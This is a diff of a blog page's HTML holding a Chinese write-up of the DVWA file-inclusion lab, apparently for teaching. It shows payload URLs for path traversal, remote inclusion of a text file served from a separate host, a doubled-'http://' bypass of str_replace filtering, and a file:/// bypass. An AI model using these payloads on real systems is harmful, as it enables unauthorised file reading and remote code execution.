@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"101.35.161.126","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="文件包含概念File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包">
+  <meta name="description" content="文件包含 概念 File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远">
 <meta property="og:type" content="article">
 <meta property="og:title" content="文件包含漏洞">
 <meta property="og:url" content="https://101.35.161.126/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
 <meta property="og:site_name" content="wys的个人博客">
-<meta property="og:description" content="文件包含概念File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包">
+<meta property="og:description" content="文件包含 概念 File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://101.35.161.126/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317213618855.png">
 <meta property="og:image" content="https://101.35.161.126/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215051380.png">
@@ -230,42 +230,48 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数<strong>（include()，require()和include_once()，require_once()）</strong>利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
-<h2 id="低等级"><a href="#低等级" class="headerlink" title="低等级"></a>低等级</h2><ol>
+        <h1 id="文件包含">文件包含</h1>
+<h2 id="概念">概念</h2>
+<p>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数<strong>（include()，require()和include_once()，require_once()）</strong>利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p>
+<h2 id="低等级">低等级</h2>
+<ol type="1">
 <li>在网页上，服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</li>
 </ol>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317213618855.png" alt></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317213618855.png"></p>
 <p>可以看到依次点击可以返回<code>file1.php</code>、<code>file2.php</code>、<code>file3.php</code> 的内容</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215051380.png" alt></p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215106647.png" alt></p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215122724.png" alt></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215051380.png"></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215106647.png"></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215122724.png"></p>
 <p>随便输入一个文件名</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215230874.png" alt></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215230874.png"></p>
 <p>报错，页面显示错误信息，没有这个文件（因为不是系统），但是暴露了服务器文件的绝对路径，于是根据经验找到了一些有趣的东西</p>
 <p>构造绝对路径：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.1*.*/dvwa/vulnerabilities/fi/?page=E:\software\phpstudy_pro\WWW\DVWA\php.ini</span><br></pre></td></tr></table></figure>
 <p>构造相对路径：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.1*.*/dvwa/vulnerabilities/fi/?page=..\..\..\..\..\software\phpstudy_pro\WWW\DVWA\php.ini</span><br></pre></td></tr></table></figure>
 <p>可以得到文件的内容：</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215412124.png" alt></p>
-<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>在服务器的php配置中，当选项allow_url_fopen与allow_url_include为开启状态 时，服务器会允许包含远程远程服务器上的文件，如果对文件来源没有检查， 就会导致 任意远程代码执行，还记得前面的这句话：服务器包含文件时，不管文件后缀是否是 php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317215412124.png"></p>
+<h3 id="远程文件包含">远程文件包含</h3>
+<p>在服务器的php配置中，当选项allow_url_fopen与allow_url_include为开启状态 时，服务器会允许包含远程远程服务器上的文件，如果对文件来源没有检查， 就会导致 任意远程代码执行，还记得前面的这句话：服务器包含文件时，不管文件后缀是否是 php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p>
 <p>我们新建一个txt文件，输入以下内容：</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220328003.png" alt></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220328003.png"></p>
 <p>我们用python创建一个文件服务器</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220304856.png" alt></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220304856.png"></p>
 <p>可以看到我们成功创建了一个文件服务器并上传了一个文件：</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220358559.png" alt></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220358559.png"></p>
 <p>我们通过输入url</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.19.*.*/dvwa/vulnerabilities/fi/?page=http://10.19.*.*:8000/poc.txt</span><br></pre></td></tr></table></figure>
 <p>可以成功的得到php的信息</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220913282.png" alt></p>
-<h3 id="中等级"><a href="#中等级" class="headerlink" title="中等级"></a>中等级</h3><p>1.查看代码可知，Medium级别的代码增加了str_replace函数，对page参数进行了一定的 处理，将”http:// ”、”<a target="_blank" rel="noopener" href="https://”、">https://”、</a> ” ../”、”..\”替换为空字符，即删除，对于相对路径包含 以及远程文件包含有一定的防御作用。</p>
-<p>2.文件包含的限制绕过<br>使用str_replace函数是极其不安全的，因为可以使用双写绕过规则，比如像下面这样~~page=ht<a target="_blank" rel="noopener" href="http://tp://106.13.129.216:8000/phpinfo.txt但str_replace函数会将中间的http：//删除，于是就只剩下http://106.13.129.216:8000/phpinfo.txt，相对路径也可以通过类似方法绕过，同时，相对路径不在防御范围内，所以还是可以直接用。">http://tp://106.13.129.216:8000/phpinfo.txt但str_replace函数会将中间的http：//删除，于是就只剩下http://106.13.129.216:8000/phpinfo.txt，相对路径也可以通过类似方法绕过，同时，相对路径不在防御范围内，所以还是可以直接用。</a></p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317220913282.png"></p>
+<h3 id="中等级">中等级</h3>
+<p>1.查看代码可知，Medium级别的代码增加了str_replace函数，对page参数进行了一定的 处理，将”http:// ”、”https://”、 ” ../”、”..”替换为空字符，即删除，对于相对路径包含 以及远程文件包含有一定的防御作用。</p>
+<p>2.文件包含的限制绕过 使用str_replace函数是极其不安全的，因为可以使用双写绕过规则，比如像下面这样~~page=hthttp://tp://106.13.129.216:8000/phpinfo.txt但str_replace函数会将中间的http：//删除，于是就只剩下http://106.13.129.216:8000/phpinfo.txt，相对路径也可以通过类似方法绕过，同时，相对路径不在防御范围内，所以还是可以直接用。</p>
 <p>通过大小写也可以绕过。</p>
 <p>相对路径可以通过以下方式绕过。</p>
-<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317221636399.png" alt></p>
-<h2 id="高等级"><a href="#高等级" class="headerlink" title="高等级"></a>高等级</h2><p>1.可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。 </p>
-<p>2.漏洞利用<br>    High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以 利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个 本地文件时，用的就是file协议。</p>
+<p><img src="/2022/03/17/%E7%BD%91%E7%BB%9C/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20220317221636399.png"></p>
+<h2 id="高等级">高等级</h2>
+<p>1.可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p>
+<p>2.漏洞利用 High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以 利用file协议绕过防护策略。file协议其实我们并不陌生，当我们用浏览器打开一个 本地文件时，用的就是file协议。</p>
 <p>我们在前面加上file:///就可以打开文件</p>
 
     </div>
